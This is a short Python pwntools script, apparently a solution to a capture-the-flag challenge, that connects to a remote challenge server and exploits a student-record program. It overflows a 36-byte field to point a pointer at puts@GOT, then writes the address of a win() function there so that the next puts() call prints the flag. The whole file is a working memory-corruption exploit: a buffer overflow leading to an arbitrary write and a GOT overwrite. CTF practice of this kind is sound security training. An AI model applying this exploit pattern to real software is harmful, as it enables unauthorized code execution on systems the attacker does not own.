from pwn import *

# Addresses
win_addr = 0x08049316
puts_got = 0x0804c02c

context.log_level = 'debug'  # Show all traffic

# Connect
p = remote('host5.metaproblems.com', 5035)

# Step 1: Create student 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'?', b'TestName')
p.sendlineafter(b'?', b'12')
p.sendlineafter(b'?', b'3.5')

# Step 2: Modify student 0, option 1 - overwrite grade_ptr with puts@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'1')

# Payload: 36 bytes + puts@GOT address
payload = b'A' * 36 + p32(puts_got)
p.sendlineafter(b': ', payload)

# Step 3: Modify student 0, option 2 - write win address to puts@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'2')
p.sendlineafter(b': ', str(win_addr).encode())

# The next puts() call will jump to win() and print the flag
# Receive everything
print("\n=== FLAG OUTPUT ===")
print(p.recvall(timeout=3).decode(errors='ignore'))

p.close()
